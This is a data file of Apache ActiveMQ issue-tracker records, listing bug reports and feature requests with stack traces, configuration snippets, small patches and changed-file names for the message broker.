texts:unhandled CancellationException in cursor duplicate detection logic
With concurrentStoreAndDispatchQueues true, a CancellationException can bubble up to pageIn in error. Failed to page in more queue messagesjava.util.concurrent.CancellationExceptionat java.util.concurrent.FutureTask.report(FutureTask.java:121)at java.util.concurrent.FutureTask.get(FutureTask.java:192)at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.gotToTheStore(AbstractStoreCursor.java:136)at org.apache.activemq.broker.region.Queue.doPageInForDispatch(Queue.java:1993) at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:2177)at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1627)at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:133)at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:48)at  java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)at java.lang.Thread.run(Thread.java:748)
issueID:AMQ-7032
type:Task
changed files:
texts:Update Shiro to version 1.2.6
Shiro-core 1.2.4 is picked up by owasp utility, update to 1.2.6 to remove issue.
issueID:AMQ-7035
type:Bug
changed files:
texts:Memory usage incorrectly increases when selectors are used in JMX operations
The default MessageEvaluationContext does referencing counting and requires a usage pattern that ends in a call to clear(), this pattern has not been applied in a few places in error. The fix for AMQ-6465 works around the non use of the pattern.The JMX operations that use a selector do not use that pattern and hence can leak a reference count.The NonCachedMessageEvaluation context does away with the reference count and this is used in most places. I think it should be used everywhere, the whole selector cache idea never got completed.
issueID:AMQ-7037
type:Improvement
changed files:
texts:Add sslContext attribute to networkConnector to override broker sslContext
Allow each network connector to specify the sslContext it needs in cases where this needs to be different from the brokerContext which is used for acceptors or from the jvm ssl defaults.
issueID:AMQ-7047
type:Improvement
changed files:
texts:Add support for TLS hostname verification
Add support to the transport on both server and client side to configure if hostname verification is enabled or disabled
issueID:AMQ-705
type:Bug
changed files:
texts:ActiveMQActivationSpec does not validate that DestinationType is set to Topic when SubscriptionDurability is set to Durable
Found problem when using Geronimo with an incorrectly configured EJB 2.0 MDB that has:         <message-driven-destination>            <destination-type>javax.jms.Queue</destination-type>            <subscription-durability>Durable</subscription-durability>         </message-driven-destination>The above config doesn"t make sense since subscription-durability is only applicable for Topics.This resulted in a message that didn"t directly point to the problem:C:	est>java  -jar geronimo-1.1-SNAPSHOTindeployer.jar --user system --password manager deploy my.ear myplan.xml    Error: Unable to distribute my.ear: JMS settings for    message-driven bean FooMDBean are not valid:    Invalid settings: clientId must be set since durable subscription  was requested. subscriptionName must be set since durable     subscription was requested. With the patch applied, the error will now be:C:	est>java  -jar geronimo-1.1-SNAPSHOTindeployer.jar --user system --password manager deploy my.ear wmyplan.xml    Error: Unable to distribute my.ear: JMS settings for    message-driven bean FooMDBean are not valid:    Invalid settings: subscriptionDurability cannot be set to: Durable  when destinationType is set to javax.jms.Queue as it is only valid when destinationType is set to javax.jms.Topic. clientId must be set since durable subscription was requested. subscriptionName must be set since durable subscription was requested.
issueID:AMQ-706
type:Bug
changed files:
texts:missing quotes in activemq.bat
The argument following "-jar" in activemq.bat is not quoted.  If %ACTIVEMQ_HOME% containsspaces, startup will fail with an error like:  Unable to access jarfile C:ProgramI haven"t tested, but the same bug may apply to the other batch files and the unix shell scripts.Attached is a trival patch to add the quotes to activemq.bat.--Brad
issueID:AMQ-710
type:Bug
changed files:
texts:Can&#39;t compile the AMQ4.0 release source,cann&#39;t find the reliant package.
Can"t compile the AMQ4.0 release source,cann"t find the reliant package.So,activesoap-1.0-SNAPSHOT.jar...
issueID:AMQ-711
type:Bug
changed files:TransactionContext.java
texts:commit() should not be called while in auto-commit mode
Unable to startup Broker Service.ERROR BrokerService                  - Failed to start ActiveMQ JMS Message Broker. Reason: java.io.IOException: commit() should not be called while in auto-commit mode.Stacktrace:java.io.IOException: commit() should not be called while in auto-commit mode.        at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:42)        at org.apache.activemq.store.jdbc.TransactionContext.close(TransactionContext.java:125)        at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.createAdapter(JDBCPersistenceAdapter.java:253)        at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.getAdapter(JDBCPersistenceAdapter.java:213)        at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.start(JDBCPersistenceAdapter.java:139)        at org.apache.activemq.store.journal.JournalPersistenceAdapter.start(JournalPersistenceAdapter.java:215)        at org.apache.activemq.broker.BrokerService.createRegionBroker(BrokerService.java:907)        at org.apache.activemq.broker.BrokerService.createBroker(BrokerService.java:867)        at org.apache.activemq.broker.BrokerService.getBroker(BrokerService.java:453)        at org.apache.activemq.broker.BrokerService.start(BrokerService.java:362)        at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:43)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1058)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:363)        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:226)        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:147)        at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:275)        at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:318)        at org.apache.xbean.spring.context.ClassPathXmlApplicationContext.<init>(ClassPathXmlApplicationContext.java:158)        at org.apache.xbean.spring.context.ClassPathXmlApplicationContext.<init>(ClassPathXmlApplicationContext.java:48)        at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:40)        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:56)        at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:81)        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:46)        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:49)        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:64)        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:49)        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:45)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:585)        at org.apache.activemq.console.Main.runTaskClass(Main.java:135)        at org.apache.activemq.console.Main.main(Main.java:67)Caused by: java.sql.SQLException: commit() should not be called while in auto-commit mode.        at net.sourceforge.jtds.jdbc.ConnectionJDBC2.commit(ConnectionJDBC2.java:1878)        at org.apache.commons.dbcp.DelegatingConnection.commit(DelegatingConnection.java:203)        at org.apache.commons.dbcp.DelegatingConnection.commit(DelegatingConnection.java:203)        at org.apache.commons.dbcp.PoolingDataSource$PoolGuardConnectionWrapper.commit(PoolingDataSource.java:199)        at org.apache.activemq.store.jdbc.TransactionContext.close(TransactionContext.java:119)Error message:ERROR: java.lang.RuntimeException: Failed to execute start task. Reason: org.springframework.beans.factory.BeanCreationException: Error creating beanwith name "org.apache.activemq.xbean.XBeanBrokerService" defined in class path resource &#91;activemq.xml&#93;: Initialization of bean failed; nested exception is java.io.IOException: commit() should not be called while in auto-commit mode.ERROR: java.lang.Exception: org.springframework.beans.factory.BeanCreationException: Error creating bean with name "org.apache.activemq.xbean.XBeanBrokerService" defined in class path resource &#91;activemq.xml&#93;: Initialization of bean failed; nested exception is java.io.IOException: commit() should not be called while in auto-commit mode.Configuration:<bean id="sqlserver-ds" class="org.apache.commons.dbcp.BasicDataSource" destroy-method="close">      <property name="driverClassName" value="net.sourceforge.jtds.jdbc.Driver"/>      <property name="url" value="jdbc:jtds:sqlserver://host/ActiveMQ;instance=D1;tds=8.0;lastupdatecount=true"/>      <property name="username" value="ActiveMQ"/>      <property name="password" value="ActiveMQPwd"/>      <property name="poolPreparedStatements" value="true"/>  </bean>
issueID:AMQ-714
type:Bug
changed files:PolicyEntry.java
QueryBasedSubscriptionRecoveryPolicy.java
FixedSizedSubscriptionRecoveryPolicy.java
NoSubscriptionRecoveryPolicy.java
FixedCountSubscriptionRecoveryPolicy.java
LastImageSubscriptionRecoveryPolicy.java
SubscriptionRecoveryPolicy.java
TimedSubscriptionRecoveryPolicy.java
texts:Wildcard support for policy entries produces unexpected results
When you define a policy Entry using a wildcard (eg. FOO.>) in the xml configuration it is not applied as expected.Specifically I was attempting to use a lastImageSubscriptionRecoveryPolicy on all subtopics of FOO.>If I publish three messages to each of FOO.a, FOO.b and FOO.c and then setup a consumer (retroactive = true) to each of the topics FOO.a, FOO.b and FOO.c I receive three copies of the last message sent to any of the topics  In this case the third message sent to FOO.c.Expected behaviour would be to receive the last message from each topic that is message three from FOO.a, FOO.b and FOO.cMore troubling is if I setup a new session with a consumer only to FOO.a and FOO.b I receive two copied of the third message sent to FOO.c.  Even though this session is not subscribed to FOO.c, presumably this is because the policy is only keeping the last message that matches the destination and returning it as the last image, regardless of if the topic matches the subscription.With explicit policy entries for each topic (FOO.a, FOO.b) the broker returns the correct messages, so I believe the problem is with wildcard handling.  I need wildcard support here because I do not know my topic names upfront.  I would think that this would be a common scenario (like setting a last image recovery policy on all stock quotes Stock.> )
issueID:AMQ-715
type:Bug
changed files:
texts:Selectors on byte properties now working.
Reported on mailing list by Marcelo Ribeiro:W"re using active-mq 4.0-rc2 and realize that any message sent are notreceived if we use a selector with a byte param. Here is the twoprograms used to show this behavior. If we change this param from byteto int it works. Is this a known bug ?Some parts are not shown to make this sample smaller.(MESSAGE SENDER)......................  public static void main(String[] args) throws Exception {      TopicPublisher publisher =getSession().createPublisher(MessageClient.topic);      System.out.println("Started...");      Message msg = getSession().createMessage();      msg.setByteProperty("dummy", (byte) 33);      publisher.publish(msg);      System.out.println("Message sent.");      try {Thread.sleep(10000);} catch (Exception exc) {}      publisher.close();      session.close();      conn.close();      System.out.println("Finished.");  }(end)(MESSAGE RECEIVER)...................... public static void main(String[] args) throws Exception {      JmsReceiverTest listen = new JmsReceiverTest();      System.out.println("Started...");      TopicSubscriber subscriber =getSession().createSubscriber(MessageClient.topic, "dummy = 33", false);      subscriber.setMessageListener(listen);      synchronized (listen) {          listen.wait(30000);      }      subscriber.close();      session.close();      conn.close();      System.out.println("Finished.");  }  public void onMessage(Message msg) {      System.out.println("Message received.");      try {          for (Enumeration e = msg.getPropertyNames();e.hasMoreElements() {              String name = (String) e.nextElement();              System.out.println("Property name: " + name + ", value =" + msg.getObjectProperty(name));          }      } catch (Exception exc) {          exc.printStackTrace();      }      this.notify();  }(end)Thanks in advance,Marcelo Ribeiro
issueID:AMQ-717
type:Improvement
changed files:
texts:Set svn properties in all text files
Could you run this script?for f in `find . -type f -iname *.xml` ; dosvn propset svn:eol-style native $fsvn propset svn:keywords ""Author Date Id Revision"" $fdoneit"d be the same for java, txt, ... filesTo make svn do it automatically check http://maven.apache.org/guides/development/guide-m2-development.html "Subversion Configuration"
issueID:AMQ-718
type:Bug
changed files:OpenWireFormat.java
texts:Incorrect length specification in loose encoding?
Unless loose-encoded length is mean to mean something different from tight-encoded length, I believe that the length written to the wire for loosely-encoded OpenWire messages is off by 4.  I imagine this hasn"t been caught before because most clients synchronously read packets off the wire and so can ignore the length specification.&#8212; activemq-core/src/main/java/org/apache/activemq/openwire/OpenWireFormat.java        (revision 399408)+++ activemq-core/src/main/java/org/apache/activemq/openwire/OpenWireFormat.java        (working copy)@@ -172,7 +172,7 @@                     sequence = baos.toByteSequence();                     if( !sizePrefixDisabled ) {-                        size = sequence.getLength()-4;+                        size = sequence.getLength();                         ByteArrayPacket packet = new ByteArrayPacket(sequence);                         PacketData.writeIntBig(packet, size);                     }@@ -253,7 +253,7 @@                 if( !sizePrefixDisabled ) {                     looseOut.close();                     ByteSequence sequence = baos.toByteSequence();-                    dataOut.writeInt(sequence.getLength()-4);+                    dataOut.writeInt(sequence.getLength());                     dataOut.write(sequence.getData(), sequence.getOffset(), sequence.getLength());                 }
issueID:AMQ-719
type:Bug
changed files:
texts:OpenWire ActiveMQTextMessage not sharable between JMS client and dotNet client
The payload content for a JMS message contains initial bytes for the length of the text string.  The payload content for an dotNet openwire content does not contain this information.  This mismatch in payload results in invalid payloads when passing jms messages between technologies.
issueID:AMQ-7206
type:Improvement
changed files:
texts:Set the secure processing feature on the TransformerFactory
None
issueID:AMQ-722
type:Improvement
changed files:
texts:More Maven 2 build improvements
None
issueID:AMQ-724
type:Bug
changed files:ConnectionState.java
AbstractConnection.java
SessionState.java
texts:Stomp client is not removed from the broker on client disconnect
If Stomp client crashes (or disconnects unexpectedly) when there are unconsumed messages in the broker, the subscriptions are not removed from the broker and some phantom consumer is still consuming messages. If you connect other client, it receives only half messages (other half messages goes to that phantom consumer still left afrter client disconnect). There are no error logs in activemq logs. We are using stomp client, whith client acknowledge mode, so on broker restart, all messages are delivered properly. You can also see in jmx console, that subscription still exists whithout any connection left.
issueID:AMQ-725
type:Bug
changed files:
texts:Messages Sent by JMS that contain header properties cause error when STOMP client registers a Subscriber
I am using the lastest 4.0 release build of ActiveMQ and I have been trying to produce messages in a JMS client and receive the messages in a STOMP client.What I have found is that if the JMS Client adds header properties to the message to be delivered to ActiveMQ then when I subscribe with the STOMP client I am receiving the Error listed below.  If I remove all header properties then the message is transmitted correctly.  I have also found that if I send messages with a STOMP client that has header properties then everything works correctly.java.lang.NullPointerExceptionat java.util.Hashtable.put(Unknown Source)at java.util.Hashtable.putAll(Unknown Source)at org.apache.activemq.transport.stomp.FrameBuilder.addHeaders(FrameBuilder.java:65)at org.apache.activemq.transport.stomp.Subscription.receive(Subscription.java:76)at org.apache.activemq.transport.stomp.StompWireFormat.writeCommand(StompWireFormat.java:154)at org.apache.activemq.transport.stomp.StompWireFormat.marshal(StompWireFormat.java:305)at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:124)at org.apache.activemq.transport.InactivityMonitor.oneway(InactivityMonitor.java:141)at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:211)at org.apache.activemq.broker.AbstractConnection.processDispatch(AbstractConnection.java:581)at org.apache.activemq.broker.AbstractConnection.iterate(AbstractConnection.java:597)at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:87)at org.apache.activemq.thread.DedicatedTaskRunner.access$000(DedicatedTaskRunner.java:24)at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:38)
issueID:AMQ-726
type:Bug
changed files:DemandForwardingBridgeSupport.java
FailoverTransport.java
texts:Network connections do not reconnect when using static: with failover=true
None
issueID:AMQ-730
type:Wish
changed files:URISupport.java
ActiveMQConnectionFactory.java
ActiveMQConnection.java
texts:Improve Javadoc
While ActiveMQ proves to be a high quality open-source JMS implementation the incomplete Javadoc decreases developer understanding, development and test time, and overall confidence of the adoption of each implementation. Although I have submitted this as a wish I would like to see an effort to beef up the documentation. I believe the community will benefit tremendously!
issueID:AMQ-731
type:Bug
changed files:TransactionContext.java
texts:Redeliveries don&#39;t work with resource adapter and Jencks
During a rollback in a JTA transaction, this exception is generated a few times:org.apache.activemq.broker.AbstractConnection.serviceException Asyncerror occurred: javax.jms.JMSException: Could not correlateacknowledgment with dispatched message: MessageAck {commandId = 137,responseRequired = false, ackType = 1, consumerId =ID:xxx-2276-1148335783189-2:5:-1:2, firstMessageId =ID:xxx-2276-1148335783189-2:1:1:1:2, lastMessageId =ID:xxx-2276-1148335783189-2:1:1:1:2, destination = queue://xxxQueue,transactionId = null, messageCount = 1}javax.jms.JMSException: Could not correlate acknowledgment withdispatched message: MessageAck {commandId = 137, responseRequired =false, ackType = 1, consumerId = ID:xxx-2276-1148335783189-2:5:-1:2,firstMessageId = ID:xxx-2276-1148335783189-2:1:1:1:2, lastMessageId =ID:xxx-2276-1148335783189-2:1:1:1:2, destination = queue://xxxQueue,transactionId = null, messageCount = 1}        atorg.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:175)        atorg.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:233)        atorg.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:362)        atorg.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:176)        atorg.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:65)        atorg.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:65)        atorg.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:78)        atorg.apache.activemq.broker.AbstractConnection.processMessageAck(AbstractConnection.java:356)        at org.apache.activemq.command.MessageAck.visit(MessageAck.java:178)        atorg.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:201)        atorg.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:62)        atorg.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:97)        atorg.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:63)        atorg.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:76)        atorg.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)        atorg.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)        atorg.apache.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1111)        atorg.apache.activemq.ActiveMQSession.asyncSendPacket(ActiveMQSession.java:1655)        atorg.apache.activemq.ActiveMQSession$2.afterRollback(ActiveMQSession.java:720)        atorg.apache.activemq.TransactionContext.afterRollback(TransactionContext.java:134)        atorg.apache.activemq.TransactionContext.rollback(TransactionContext.java:409)        atorg.apache.activemq.ra.LocalAndXATransaction.rollback(LocalAndXATransaction.java:126)        atorg.apache.geronimo.transaction.manager.WrapperNamedXAResource.rollback(WrapperNamedXAResource.java:78)        atcom.caucho.transaction.TransactionImpl.rollbackInt(TransactionImpl.java:787)        atcom.caucho.transaction.TransactionImpl.commit(TransactionImpl.java:560)        at org.jencks.XAEndpoint.afterDelivery(XAEndpoint.java:103)        atorg.apache.activemq.ra.MessageEndpointProxy$MessageEndpointAlive.afterDelivery(MessageEndpointProxy.java:125)        atorg.apache.activemq.ra.MessageEndpointProxy.afterDelivery(MessageEndpointProxy.java:64)        atorg.apache.activemq.ra.ServerSessionImpl.afterDelivery(ServerSessionImpl.java:214)        at org.apache.activemq.ActiveMQSession.run(ActiveMQSession.java:751)        atorg.apache.activemq.ra.ServerSessionImpl.run(ServerSessionImpl.java:163)        at com.caucho.jca.WorkThread.run(WorkThread.java:99)        at com.caucho.util.ThreadPool.runTasks(ThreadPool.java:490)        at com.caucho.util.ThreadPool.run(ThreadPool.java:423)        at java.lang.Thread.run(Thread.java:595) Note that the ackType is a poison ack.  This shouldn"t be the case as the configuration (below) on the resource adapter and the managed connection factory both specify 9 redeliveries.  Redelivery does not happen.Broker configuration:<?xml version="1.0" encoding="UTF-8"?><beans xmlns="http://activemq.org/config/1.0">        <broker persistent="false" useJmx="false">                <transportConnectors>                        <transportConnector uri="vm://localhost" />                </transportConnectors>                <persistenceAdapter>                        <memoryPersistenceAdapter />                </persistenceAdapter>        </broker></beans>Spring configuration:        <bean id="jms.connectionFactory"class="org.springframework.jca.support.LocalConnectionFactoryBean">                <property name="connectionManager">                        <bean class="com.xxx.jca.ResinConnectionManagerFactoryBean">                                <property name="localTransaction">                                        <value>false</value>                                </property>                                <property name="localTransactionOptimization">                                        <value>false</value>                                </property>                                <property name="managedConnectionFactory">                                        <ref local="jms.managedConnectionFactory" />                                </property>                                <property name="xaTransaction">                                        <value>true</value>                                </property>                        </bean>                </property>                <property name="managedConnectionFactory">                        <ref local="jms.managedConnectionFactory" />                </property>        </bean>        <bean id="jms.jcaContainer" class="org.jencks.JCAContainer">                <property name="bootstrapContext">                        <bean class="com.xxx.jca.ResinBootstrapContextFactoryBean" />                </property>                <property name="resourceAdapter">                        <ref local="jms.resourceAdapter" />                </property>        </bean>        <bean id="jms.managedConnectionFactory"class="org.apache.activemq.ra.ActiveMQManagedConnectionFactory">                <property name="allPrefetchValues">                        <value>1</value>                </property>                <property name="initialRedeliveryDelay">                        <value>2000</value>                </property>                <property name="maximumRedeliveries">                        <value>9</value>                </property>                <property name="redeliveryBackOffMultiplier">                        <value>2</value>                </property>                <property name="redeliveryUseExponentialBackOff">                        <value>true</value>                </property>                <property name="resourceAdapter">                        <ref local="jms.resourceAdapter" />                </property>        </bean>        <bean id="jms.broker" class="org.apache.activemq.xbean.BrokerFactoryBean">                <property name="config">                        <value>classpath:activemq.xml</value>                </property>                <property name="start">                        <value>true</value>                </property>        </bean>        <bean id="jms.resourceAdapter"class="org.apache.activemq.ra.ActiveMQResourceAdapter"depends-on="jms.broker">                <property name="allPrefetchValues">                        <value>1</value>                </property>                <property name="initialRedeliveryDelay">                        <value>2000</value>                </property>                <property name="maximumRedeliveries">                        <value>9</value>                </property>                <property name="redeliveryBackOffMultiplier">                        <value>2</value>                </property>                <property name="redeliveryUseExponentialBackOff">                        <value>true</value>                </property>                <property name="serverUrl">                        <value>vm://localhost</value>                </property>        </bean>I have written a test case using Geronimo"s TM, but it succeeds.  The configuration is very different, so I don"t think it can be attributed to just a simple change in TM.  A lot of other configuration changes had to be made.
issueID:AMQ-732
type:Bug
changed files:LogFileManager.java
texts:Infinite recovery loop.
The simplest way to reproduce the problem:1. Remove storage directory. 2. Start broker using the following code: public static void main(String[] args)  throws Exception {           BrokerService broker = new BrokerService();           broker.setPersistent(true);           DefaultPersistenceAdapterFactory pFactory = new DefaultPersistenceAdapterFactory();           pFactory.setJournalLogFiles(1);           pFactory.setJournalLogFileSize(2048);           broker.setPersistenceFactory(pFactory);           broker.setUseJmx(false);           broker.addConnector("tcp://localhost:61616");           broker.start();           Thread.sleep(1000000000000l);   }3. Shutdown the broker.4. Start broker.It enters infinite loop[                          main] BrokerService                  INFO  ActiveMQ null JMS Message Broker (localhost) is starting[                          main] BrokerService                  INFO  For help or more information please see: http://incubator.apache.org/activemq/[                          main] JDBCPersistenceAdapter         INFO  Database driver recognized: &#91;apache_derby_embedded_jdbc_driver&#93;[                          main] DefaultJDBCAdapter             DEBUG Executing SQL: CREATE TABLE ACTIVEMQ_MSGS(ID INTEGER NOT NULL, CONTAINER VARCHAR(250), MSGID_PROD VARCHAR(250), MSGID_SEQ INTEGER, EXPIRATION BIGINT, MSG BLOB, PRIMARY KEY ( ID ) )[                          main] DefaultJDBCAdapter             DEBUG Could not create JDBC tables; The message table already existed. Failure was: CREATE TABLE ACTIVEMQ_MSGS(ID INTEGER NOT NULL, CONTAINER VARCHAR(250), MSGID_PROD VARCHAR(250), MSGID_SEQ INTEGER, EXPIRATION BIGINT, MSG BLOB, PRIMARY KEY ( ID ) ) Message: Table/View "ACTIVEMQ_MSGS" already exists in Schema "APP". SQLState: X0Y32 Vendor code: 20000[                          main] DefaultJDBCAdapter             DEBUG Executing SQL: CREATE INDEX ACTIVEMQ_MSGS_MIDX ON ACTIVEMQ_MSGS (MSGID_PROD,MSGID_SEQ)[                          main] DefaultJDBCAdapter             DEBUG Executing SQL: CREATE INDEX ACTIVEMQ_MSGS_CIDX ON ACTIVEMQ_MSGS (CONTAINER)[                          main] DefaultJDBCAdapter             DEBUG Executing SQL: CREATE INDEX ACTIVEMQ_MSGS_EIDX ON ACTIVEMQ_MSGS (EXPIRATION)[                          main] DefaultJDBCAdapter             DEBUG Executing SQL: CREATE TABLE ACTIVEMQ_ACKS(CONTAINER VARCHAR(250) NOT NULL, CLIENT_ID VARCHAR(250) NOT NULL, SUB_NAME VARCHAR(250) NOT NULL, SELECTOR VARCHAR(250), LAST_ACKED_ID INTEGER, PRIMARY KEY ( CONTAINER, CLIENT_ID, SUB_NAME))[                          main] DefaultJDBCAdapter             DEBUG Could not create JDBC tables; The message table already existed. Failure was: CREATE TABLE ACTIVEMQ_ACKS(CONTAINER VARCHAR(250) NOT NULL, CLIENT_ID VARCHAR(250) NOT NULL, SUB_NAME VARCHAR(250) NOT NULL, SELECTOR VARCHAR(250), LAST_ACKED_ID INTEGER, PRIMARY KEY ( CONTAINER, CLIENT_ID, SUB_NAME)) Message: Table/View "ACTIVEMQ_ACKS" already exists in Schema "APP". SQLState: X0Y32 Vendor code: 20000[                          main] JDBCPersistenceAdapter         DEBUG Cleaning up old messages.[                          main] DefaultJDBCAdapter             DEBUG Executing SQL: DELETE FROM ACTIVEMQ_MSGS WHERE ( EXPIRATION<>0 AND EXPIRATION<?) OR ID <= ( SELECT min(ACTIVEMQ_ACKS.LAST_ACKED_ID) FROM ACTIVEMQ_ACKS WHERE ACTIVEMQ_ACKS.CONTAINER=ACTIVEMQ_MSGS.CONTAINER)[                          main] DefaultJDBCAdapter             DEBUG Deleted 0 old message(s).[                          main] JDBCPersistenceAdapter         DEBUG Cleanup done.[                          main] JournalPersistenceAdapter      INFO  Journal Recovery Started from: Active Journal: using 1 x 0.001953125 Megs at: /workplace/fateev/install/activemq-4.0-SNAPSHOT/activemq-core/activemq-data/journal[                          main] JournalPersistenceAdapter      DEBUG TRACE Entry: RECOVERED[                Journal Writer] LogFileManager                 DEBUG getNextDataRecordLocation offset=53[                Journal Writer] LogFileManager                 DEBUG getNextDataRecordLocation offset=97[                Journal Writer] LogFileManager                 DEBUG getNextDataRecordLocation overflowing into next logFile=0[                          main] JournalPersistenceAdapter      DEBUG TRACE Entry: RECOVERED[                Journal Writer] LogFileManager                 DEBUG getNextDataRecordLocation offset=53[                Journal Writer] LogFileManager                 DEBUG getNextDataRecordLocation offset=97[                Journal Writer] LogFileManager                 DEBUG getNextDataRecordLocation overflowing into next logFile=0[                          main] JournalPersistenceAdapter      DEBUG TRACE Entry: RECOVERED[                Journal Writer] LogFileManager                 DEBUG getNextDataRecordLocation offset=53[                Journal Writer] LogFileManager                 DEBUG getNextDataRecordLocation offset=97[                Journal Writer] LogFileManager                 DEBUG getNextDataRecordLocation overflowing into next logFile=0The log entry from getNextDataRecordLocation is coming from log statement I"ve added to LogFileManager.getNextDataRecordLocation:   public Location getNextDataRecordLocation(Location lastLocation) throws IOException, InvalidRecordLocationException {        RecordInfo ri = readRecordInfo(lastLocation);        while (true) {            int logFileId = ri.getLocation().getLogFileId();            int offset = ri.getNextLocation();            log.debug("getNextDataRecordLocation offset=" + offset);            // Are we overflowing into next logFile?            if (offset >= ri.getLogFileState().getAppendOffset()) {                LogFileNode nextActive = ri.getLogFileState().getNextActive();                log.debug("getNextDataRecordLocation overflowing into next logFile=" + (nextActive == null ? "null"  : String.valueOf(nextActive.getId())));                if (nextActive == null) {                    return null;                }                logFileId = nextActive.getId();                offset = 0;            }            try {                ri = readRecordInfo(new Location(logFileId, offset));            } catch (InvalidRecordLocationException e) {                return null;            }            // Is the next record the right record type?            if (ri.getHeader().getRecordType() == DATA_RECORD_TYPE) {                return ri.getLocation();            }            // No? go onto the next record.        }    }It looks like recovery doesn"t take into account that journaling storage file should have some end at some point. Similar problem happens if multiple files of bigger size are used. It happens every time one of the log files grows bigger then size specified in pFactory.setJournalLogFileSize(...) call.
issueID:AMQ-734
type:Bug
changed files:DemandForwardingBridgeSupport.java
texts:Network connections do not reconnect when using static: with failover=true
If I pull out RJ45 port from net card ,waiting a time ,then put  RJ45 port net card .Network is resume.Other computer always throw errors and net channel can"t work.
issueID:AMQ-736
type:Bug
changed files:JournalMessageStore.java
texts:Broker is not delivering all messages to slow consumer
When producer produces more messages than consumer can handle, after some time some messages are not delivered to the consumer (they are just skipped). To get those messages from the broker, you need to reconnect the consumer. It seems that this bug only occures if message persistance is turned on in the broker.
issueID:AMQ-742
type:New Feature
changed files:DefaultPersistenceAdapterFactory.java
texts:Allow standby broker to be started and have it wait for the master to fail before taking over it&#39;s data files.
Currently if you try to start a broker that uses the same datafiles as a broker that is allready running, the broker will not start up.
issueID:AMQ-747
type:Improvement
changed files:ActiveMQSession.java
ActiveMQMessageConsumer.java
RedeliveryPolicy.java
texts:Redelivery backoff should add random delay for collision avoidance
If a rollback on two messages happens between three transactional deliveries, and the two messages are redelivered with the same redelivery backoff settings, there is a likelihood that both messages will cause another rollback to happen.  If maximumRedeliveries is set too low, or there are a maximumRedeliveries + 1 messages coming in simultaneously, messages may never get delivered.  Can we get another option for the clients that adds a random backoff delay adjustment in addition to the constant backoff delay factor?  This would end up working like most other collision avoidance algorithms.
issueID:AMQ-748
type:New Feature
changed files:
texts:Add request-id and response-id headers to STOMP connect/connected handshake
For the new activemq-cpp library, we need to extend the STOMP connect/connected handshake so that we get back a response-id for our response correlator.  To do this, we need to send something in the connect request that contains a client-defined request-id.  My first thought was to just reuse the message-id header, but that is typically reserved for cases when a client is expecting to acknowledge a message.  So rather than risk breaking that paradigm, I propose a new header "request-id" that is just used on the connect message.  When the broker receives a connect request with a request-id header, it creates a connected response with a response-id set to the request-id of the original request.  This way the client can treat the handshake as a true request/response.
issueID:AMQ-749
type:Bug
changed files:ConnectionDotFileInterceptor.java
texts:ConnectionDotFileInterceptor not thread safe.
